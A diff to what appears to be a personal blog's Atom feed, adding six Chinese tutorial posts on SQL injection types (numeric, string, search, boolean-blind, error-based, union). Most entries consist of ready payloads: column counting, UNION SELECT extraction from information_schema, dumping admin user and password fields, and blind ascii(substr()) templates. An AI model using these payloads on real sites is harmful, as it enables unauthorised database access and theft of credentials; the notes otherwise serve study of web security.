@@ -49,6 +49,163 @@
   </entry>
   
   <entry>
+    <title>6.SQL注入(联合查询)</title>
+    <link href="http://xxynly.xyz/2021/03/12/6.SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)/"/>
+    <id>http://xxynly.xyz/2021/03/12/6.SQL%E6%B3%A8%E5%85%A5(%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)/</id>
+    <published>2021-03-12T11:28:30.000Z</published>
+    <updated>2021-03-31T08:11:09.240Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>要用联合查询进行注入则：页面必须有显示位</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>union可合并两个或多个select语句的结果集，<br>前提是两个select必有相同列、且各列的数据类型也相同</p><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li>找注入点且得到闭合字符</li><li>判断数据库类型<br>?id=1”) and version()&gt;0 –+返回正确，则可能是sqlserver和mysql<br>?id=1”) and length(user())&gt;0 –+<br>存在user函数，为mysql</li><li>猜解列数，得到显示位<br>?id=1’ order by 3 –+<br>?id=1’ order by 4 –+<br>?id=-1’ UNION SELECT 1,2,3 –+</li><li>得到基本信息(如：数据库名、数据库版本、当前数据库名等)<br>?id=-1’ UNION SELECT 1,concat_ws(“~”,database(),user(),version(),@@basedir),3 –+</li><li>得到数据库名<br>?id=-1’ UNION SELECT 1,count(distinct table_schema),3 from information_schema.tables –+<br>?id=-1’ UNION SELECT 1,count(distinct 1,table_schema),3 from information_schema.tables limit 4,1 –+<br>依次得到数据库名</li><li>得到表名<br>?id=-1’ UNION SELECT 1,group_concat(table)</li><li>得到列名</li><li>得到列值</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;要用联合查询进行注入则：页面必须有显示位&lt;/p&gt;
+&lt;h2 id=&quot;联合查询&quot;&gt;&lt;a href=&quot;#联合查询&quot; class=&quot;headerli</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>5.SQL注入(报错型)</title>
+    <link href="http://xxynly.xyz/2021/03/11/5.SQL%E6%B3%A8%E5%85%A5(%E6%8A%A5%E9%94%99%E5%9E%8B)/"/>
+    <id>http://xxynly.xyz/2021/03/11/5.SQL%E6%B3%A8%E5%85%A5(%E6%8A%A5%E9%94%99%E5%9E%8B)/</id>
+    <published>2021-03-11T11:28:30.000Z</published>
+    <updated>2021-03-31T08:11:23.825Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>count(*)、rand()、group by三者缺一不可<br>报错注入用一个公式，只要套用公式即可，公式如下:<br><code>?id=2&#39; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (爆错语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a)--+</code></p><h2 id="公式解析"><a href="#公式解析" class="headerlink" title="公式解析"></a>公式解析</h2><p><code>floor()</code>是取整数<br><code>rand()</code>在0和1之间产生一个随机数<br><code>rand(0)*2</code>将取0到2的随机数<br><code>floor(rand()*2)</code>有两条记录就会报错<br><code>floor(rand(0)*2)</code>记录需为3条以上，且3条以上必报错，返回的值是有规律的<br><code>count(*)</code>是用来统计结果的，相当于刷新一次结果<br><code>group by</code>在对数据进行分组时会先看看虚拟表里有没有这个值，没有的话就插入存在的话<code>count(*)</code>加1<br>在使用<code>group by</code>时<code>floor(rand(0)*2)</code>会被执行一次，若虚表不存在记录，插入虚表时会再执行一次</p><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><p>得到闭合字符<br>猜列数、尝试爆显示位<br>得到数据库个数和数据库名<br>得到表个数和表名<br>得到列数量和列名<br>得到列值</p><ol><li>猜测闭合字符:<br>?id=1’多了一个单引号，所以闭合字符为单引号<br>?id=1’ –+返回正确页面，所以闭合字符为单引号</li><li>猜测列数<br>?id=1’ order by 3 –+<br>?id=1’ order by 4 –+<br>3正确4错误，则为2</li><li>尝试得到显示位<br>?id=1’ UNION SELECT 1,2,3 –+</li><li>报错得到数据库个数<br>…</li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;&lt;p&gt;一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，它的特点是注入速度快，但是语句较复杂,不能用gr</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>4.SQL注入(布尔型)</title>
+    <link href="http://xxynly.xyz/2021/03/10/4.SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E5%9E%8B)/"/>
+    <id>http://xxynly.xyz/2021/03/10/4.SQL%E6%B3%A8%E5%85%A5(%E5%B8%83%E5%B0%94%E5%9E%8B)/</id>
+    <published>2021-03-10T11:28:30.000Z</published>
+    <updated>2021-03-31T08:11:36.231Z</updated>
+    
+    <content type="html"><![CDATA[<p>首先测试是否为布尔盲注：<br><code>http://localhost/index.php?id=2 http://localhost/index.php?id=2&#39; http://localhost/index.php?id=2&#39;&#39; http://localhost/index.php?id=2%23 http://localhost/index.php?id=2&#39; and 1=1#</code><br>若为布尔盲注，则按照以下步骤进行：</p><h2 id="一、得到数据库的长度"><a href="#一、得到数据库的长度" class="headerlink" title="一、得到数据库的长度"></a>一、得到数据库的长度</h2><p><code>php?id=2&#39; and length(database())&gt;1%23</code></p><h2 id="二、获取数据库名称"><a href="#二、获取数据库名称" class="headerlink" title="二、获取数据库名称"></a>二、获取数据库名称</h2><p><code>&#39; and ascii(substr(database(), &#123;0&#125;, 1))=&#123;1&#125;%23 python</code><br>脚本自动获取</p><h2 id="三、获取表长度"><a href="#三、获取表长度" class="headerlink" title="三、获取表长度"></a>三、获取表长度</h2><p><code>.php?id=2&#39; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0 %23</code></p><h2 id="四、获取表名"><a href="#四、获取表名" class="headerlink" title="四、获取表名"></a>四、获取表名</h2><p><code>php?id=2&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1)), &#123;0&#125;, 1)=&#123;1&#125;%23</code></p><h2 id="五、获取字段的个数和长度"><a href="#五、获取字段的个数和长度" class="headerlink" title="五、获取字段的个数和长度"></a>五、获取字段的个数和长度</h2><p><code>php?id=2&#39; and (select length(column_name) from information_schema.columns where table_name = 0x666C6167 limit 0,1)&gt;0%23</code><br>其中limit 0,1表示第一列，limit 1,1为第二列，依次类推。</p><h2 id="六、获取字段名称"><a href="#六、获取字段名称" class="headerlink" title="六、获取字段名称"></a>六、获取字段名称</h2><p><code>php?id=2&#39; and ascii(substr((select column_name from information_schema.columns where table_name = 0x666C6167 limit 0,1), &#123;0&#125;, 1))=&#123;1&#125;%23</code></p><h2 id="七、脱库"><a href="#七、脱库" class="headerlink" title="七、脱库"></a>七、脱库</h2><p>1.首先判断该表有多少条记录：<br><code>php?id=2&#39; and (select count(*) from flag)&gt;0%23</code><br>2.然后获取当前记录的长度：<br><code>php?id=2&#39; and (select length(flag) from flag limit 0,1)&gt;0%23</code><br>3.获取当前记录的值：<br><code>php?id=2&#39; and ascii(substr((select flag from flag limit 0,1), &#123;0&#125;, 1))=&#123;1&#125;%23</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;首先测试是否为布尔盲注：&lt;br&gt;&lt;code&gt;http://localhost/index.php?id=2 http://localhost/index.php?id=2&amp;#39; http://localhost/index.php?id=2&amp;#39;&amp;#39; http</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>3.SQL注入(搜索型)</title>
+    <link href="http://xxynly.xyz/2021/03/09/3.SQL%E6%B3%A8%E5%85%A5(%E6%90%9C%E7%B4%A2%E5%9E%8B)/"/>
+    <id>http://xxynly.xyz/2021/03/09/3.SQL%E6%B3%A8%E5%85%A5(%E6%90%9C%E7%B4%A2%E5%9E%8B)/</id>
+    <published>2021-03-09T11:28:30.000Z</published>
+    <updated>2021-03-31T08:11:49.209Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、搜索型注入简介与原理"><a href="#一、搜索型注入简介与原理" class="headerlink" title="一、搜索型注入简介与原理"></a>一、搜索型注入简介与原理</h2><h3 id="1）简介"><a href="#1）简介" class="headerlink" title="1）简介"></a>1）简介</h3><p>一些网站为了方便用户查找网站的资源,都对用户提供了搜索的功能,因为是搜索功能,往往是程序员在编写代码时都忽略了对其变量(参数)的过滤,而且这样的漏洞在国内的系统中普遍的存在:<br>其中又分为POST/GET,<br>GET型的一般是用在网站上的搜索,<br>而POST则用在用户名的登录,<br>可以从form表单的method=”get”属性来区分是get还是post。搜索型注入又称为文本框注入。</p><h3 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h3><p><code>$sql=&quot;select * from user where password like &#39;%$pwd%&#39; order by password&quot;;</code><br>这句SQL的语句就是基于用户输入的pwd在users表中找到相应的password，正常用户当然会输入例如admin,ckse等等。但是如果有人输入这样的内容呢？<br><code>&#39;and 1=1 and &#39;%&#39;=&#39;  </code><br>这样的话这句SQL语句就变成了这样<br><code>select * from user where password like &#39;%fendo&#39;and 1=1 and &#39;%&#39;=&#39;%&#39; order by password  </code><br>存在SQL注入。</p><h2 id="二、搜索型注入判断"><a href="#二、搜索型注入判断" class="headerlink" title="二、搜索型注入判断"></a>二、搜索型注入判断</h2><p>判断搜索型注入的方法：<br>1 搜索keywords‘，如果出错的话，有90%的可能性存在漏洞；<br>2 搜索 keywords%，如果同样出错的话，就有95%的可能性存在漏洞；<br>3 搜索keywords% ‘and 1=1 and ‘%’=’（这个语句的功能就相当于普通SQL注入的 and 1=1）看返回的情况<br>4 搜索keywords% ‘and 1=2 and ‘%’=’（这个语句的功能就相当于普通SQL注入的 and 1=2）看返回的情况<br>5 根据两次的返回情况来判断是不是搜索型文本框注入了<br>下面这几种语句都可以:<br><code>&#39;and 1=1 and &#39;%&#39;=&#39; %&#39; and 1=1--&#39; %&#39; and 1=1 and &#39;%&#39;=&#39;</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、搜索型注入简介与原理&quot;&gt;&lt;a href=&quot;#一、搜索型注入简介与原理&quot; class=&quot;headerlink&quot; title=&quot;一、搜索型注入简介与原理&quot;&gt;&lt;/a&gt;一、搜索型注入简介与原理&lt;/h2&gt;&lt;h3 id=&quot;1）简介&quot;&gt;&lt;a href=&quot;#1）简介&quot; cla</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>2.SQL注入(字符型)</title>
+    <link href="http://xxynly.xyz/2021/03/08/2.SQL%E6%B3%A8%E5%85%A5(%E5%AD%97%E7%AC%A6%E5%9E%8B)/"/>
+    <id>http://xxynly.xyz/2021/03/08/2.SQL%E6%B3%A8%E5%85%A5(%E5%AD%97%E7%AC%A6%E5%9E%8B)/</id>
+    <published>2021-03-08T11:28:30.000Z</published>
+    <updated>2021-03-31T08:12:06.775Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、什么是字符型注入以及原理"><a href="#一、什么是字符型注入以及原理" class="headerlink" title="一、什么是字符型注入以及原理"></a>一、什么是字符型注入以及原理</h2><h3 id="1．字符型注入简介"><a href="#1．字符型注入简介" class="headerlink" title="1．字符型注入简介"></a>1．字符型注入简介</h3><p>字符串或串(String)是由数字、字母、下划线组成的一串字符。一般记为 s=“a1 a2 ···an ” (n&gt;=0)。它是编程语言中表示文本的数据类型。<br>字符型注入就是把输入的参数当做字符串来对数据库进行查询,字符型注入在sql语句中都采用单引号括起来。</p><h3 id="2．基本原理"><a href="#2．基本原理" class="headerlink" title="2．基本原理:"></a>2．基本原理:</h3><p><code>$query=&quot;select first_name from users where id=&#39;$_GET[&#39;id&#39;]&#39;&quot;;</code><br>这句SQL的语句就是基于用户输入的id在users表中找到相应的first_name，正常用户当然会输入例如1,2等等。但是如果有人输入这样的内容呢？<br><code>1&#39; union select database() #;</code><br>这样的话这句SQL语句就变成了这样<br><code>select first_name from users where id=&#39;1&#39;union select database()#&#39;</code><br>这样的话，我们不仅可以得到id=1的first_name，还可以得到当前数据库的相关信息，这是开发人员所没有想到的。以上只是一个简单的SQL注入的例子。<br>从根本上讲，当开发人员对用户的输入过滤不严，造成了用户可以通过输入SQL语句控制数据库，就会产生SQL注入漏洞。<br>简而言之，基于字符型的SQL注入即存在SQL注入漏洞的URL参数为字符串类型（需要使用单引号表示）。<br><strong>字符型SQL注入的关键—–单引号的闭合</strong><br>MySQL数据库对于单引号的规则如下：</p><ul><li>单引号必须成对出现，否则数据库就会报错。</li><li>如果两个单引号之间内容为空，数据库自动忽略。<br>应用程序数据库的字符型SQL语句为：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from tables where idproduct&#x3D;’13’;  </span><br><span class="line">select * from tables where name&#x3D;’fendo’;</span><br><span class="line">select * from tables where data&#x3D;’01&#x2F;01&#x2F;2017’;</span><br></pre></td></tr></table></figure><h2 id="二、字符型注入与数字型注入的区别"><a href="#二、字符型注入与数字型注入的区别" class="headerlink" title="二、字符型注入与数字型注入的区别"></a>二、字符型注入与数字型注入的区别</h2><p>字符：除数字之外都是字符<br>数字：0-9<br>两种SQL语句的区别:<br>数字型： SELECT 列 FROM 表 WHERE 数字型列=值<br>字符型： SELECT 列 FROM 表 WHERE 字符型列=’值’</p><h2 id="三、如何判断是否是字符型注入"><a href="#三、如何判断是否是字符型注入" class="headerlink" title="三、如何判断是否是字符型注入"></a>三、如何判断是否是字符型注入</h2><p>测试注入语句是：<br><code>xx&#39; and &#39;1&#39;=1--&#39;  xx&#39; and &#39;1=2--&#39;</code><br>如果第一个页面正常，而使用第二个的时候页面出现错误则，该url可以进行字符型注入</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、什么是字符型注入以及原理&quot;&gt;&lt;a href=&quot;#一、什么是字符型注入以及原理&quot; class=&quot;headerlink&quot; title=&quot;一、什么是字符型注入以及原理&quot;&gt;&lt;/a&gt;一、什么是字符型注入以及原理&lt;/h2&gt;&lt;h3 id=&quot;1．字符型注入简介&quot;&gt;&lt;a hre</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>1.SQL注入（数字型）</title>
+    <link href="http://xxynly.xyz/2021/03/07/1.SQL%E6%B3%A8%E5%85%A5(%E6%95%B0%E5%AD%97%E5%9E%8B)/"/>
+    <id>http://xxynly.xyz/2021/03/07/1.SQL%E6%B3%A8%E5%85%A5(%E6%95%B0%E5%AD%97%E5%9E%8B)/</id>
+    <published>2021-03-07T11:28:30.000Z</published>
+    <updated>2021-03-31T08:12:09.715Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="1-常见的几种SQL注入"><a href="#1-常见的几种SQL注入" class="headerlink" title="1.常见的几种SQL注入"></a>1.常见的几种SQL注入</h2><p>1.数字型<br>2.字符型<br>3.文本型<br>4.搜索型(POST/GET)<br>5.cookie注入<br>6.SQL盲注<br>7.编码注入<br>8.宽字节注入</p><h2 id="2-MySQL报错注入基本流程："><a href="#2-MySQL报错注入基本流程：" class="headerlink" title="2.MySQL报错注入基本流程："></a>2.MySQL报错注入基本流程：</h2><h3 id="1-判断sql注入"><a href="#1-判断sql注入" class="headerlink" title="1.判断sql注入"></a>1.判断sql注入</h3><h4 id="○提交单引号’"><a href="#○提交单引号’" class="headerlink" title="○提交单引号’"></a>○提交单引号’</h4><h4 id="○and大法和or大法"><a href="#○and大法和or大法" class="headerlink" title="○and大法和or大法"></a>○and大法和or大法</h4><p>and 1=1和and 1=2看看有什么不同?<br>发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。<br>or 1=1,or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。</p><h4 id="○加法和减法"><a href="#○加法和减法" class="headerlink" title="○加法和减法"></a>○加法和减法</h4><p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。<br>1.加法<br>我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。<br>2.减法<br>减法是同样的道理，不过不需要对-号进行url编码了</p><h3 id="2-数据库权限判断"><a href="#2-数据库权限判断" class="headerlink" title="2.数据库权限判断"></a>2.数据库权限判断</h3><p>and ord(mid(user(),1,1))=114  判断ROOT权限 返回正确存在<br>或 <code>and (select count(*) from mysql.user)&gt;0</code><br><code>and (select count(*) from mysql.user)&gt;0</code>   /* 如果结果返回正常,说明具有读写权限。<br><code>and (select count(*) from mysql.user)&gt;0</code>   /* 返回错误，应该是管理员给数据库帐户降权了。</p><h3 id="3-判断字段数"><a href="#3-判断字段数" class="headerlink" title="3.判断字段数"></a>3.判断字段数</h3><p>常用的两种猜解方式:</p><h4 id="方法1、用union联合查询：and-1-1-union-select-1-2-3-4-5……-或-union-select-null-null-null…"><a href="#方法1、用union联合查询：and-1-1-union-select-1-2-3-4-5……-或-union-select-null-null-null…" class="headerlink" title="方法1、用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null….."></a>方法1、用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null…..</h4><p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。<br>例：<br>当字段为2时页面返回错误，为3时，显示正确，为4时错误，说明字段数就是3，输入的数大于或小于字段数时都会报错。使用 union select null,null,null 是一样的</p><h4 id="方法2、用order-by-查询“order-by-–-order-by"><a href="#方法2、用order-by-查询“order-by-–-order-by" class="headerlink" title="方法2、用order by 查询“order by * – order by"></a>方法2、用order by 查询“order by * – order by</h4><p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。<br>例：<br>当我们测试到4时数据库报错，说明该表只有3个字段<br>***这里有两个问题</p><h5 id="第一个：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。"><a href="#第一个：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。" class="headerlink" title="第一个：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。"></a>第一个：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。</h5><p>第一种：我们让第一个查询的结果始终为假，什么都没有显示???? 因为这使用的null，所以返回的就是null<br>第二种：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据<br><code>LIMIT [offset] rows | rows OFFSET offset</code><br>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。<br>列:<br><code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15</code></p><h5 id="第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union-select-不仅要求列的数量相同-同时数据类型也要相似。"><a href="#第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union-select-不仅要求列的数量相同-同时数据类型也要相似。" class="headerlink" title="第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。"></a>第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。</h5><p><code>http://localhost/sqls/index.php?id=2  union select 1,2,3 limit 1,1</code></p><h3 id="4-查询库名"><a href="#4-查询库名" class="headerlink" title="4.查询库名"></a>4.查询库名</h3><p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。<br>通过下面的语句可以判断数据库版本<br><code>and ord(mid(version(),1,1))&gt;51</code><br>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；<br>解释2：ord()是mysql的函数用于获取二进制码；<br>解释3：mid()是mysql的函数用于截位操作；<br>解释4：version()是mysql的函数用于获取当前数据库的版本；<br>方法一:<br>可以直接使用mysql自带函数database()查询得到数据库名：<br><code>http://localhost/sqls/index.php?id=2 union select 1,database(),3 limit 1,1</code><br>方法二:<br>使用以下语句语句得到所有的数据库名<br><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata</code></p><h3 id="5-查表名"><a href="#5-查表名" class="headerlink" title="5.查表名"></a>5.查表名</h3><p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。<br>方法一:<br>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。<br>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。<br><code>php?id=2 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;test&#39;</code><br>方法二:<br><code>php?id=2 union select null,table_name,null from information_schema.tables where table_schema=&#39;test&#39;</code></p><h3 id="6-查字段"><a href="#6-查字段" class="headerlink" title="6.查字段"></a>6.查字段</h3><p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。<br>方法一:<br><code>php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;sqltest&#39;</code><br>方法二:<br><code>php?id=2  union select null,column_name,null from information_schema.columns where table_schema=&#39;test&#39; and table_name=&#39;admin&#39;</code></p><h3 id="7-查数据"><a href="#7-查数据" class="headerlink" title="7.查数据"></a>7.查数据</h3><p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。<br>查询admin表:<br><code>php?id=2 and 1=2 union select 1,group_concat(id,user,pwd),3 from admin</code><br>方法二:<br><code>php?id=2 union select null,title,content from sqltest</code></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;1-常见的几种SQL注入&quot;&gt;&lt;a href=&quot;#1-常见的几种SQL注入&quot; class=&quot;headerlink&quot; title=&quot;1.常见的几种SQL注入&quot;&gt;&lt;/a&gt;1.常见的几种SQL注入&lt;/h2&gt;&lt;p&gt;1.数字型&lt;br&gt;2.字符型&lt;br&gt;3.文本型&lt;br&gt;4.搜</summary>
+      
+    
+    
+    
+    <category term="SQL" scheme="http://xxynly.xyz/categories/SQL/"/>
+    
+    
+    <category term="web" scheme="http://xxynly.xyz/tags/web/"/>
+    
+    <category term="SQL" scheme="http://xxynly.xyz/tags/SQL/"/>
+    
+  </entry>
+  
+  <entry>
     <title>google hack 语法</title>
     <link href="http://xxynly.xyz/2021/03/05/Google-hack%E8%AF%AD%E6%B3%95/"/>
     <id>http://xxynly.xyz/2021/03/05/Google-hack%E8%AF%AD%E6%B3%95/</id>
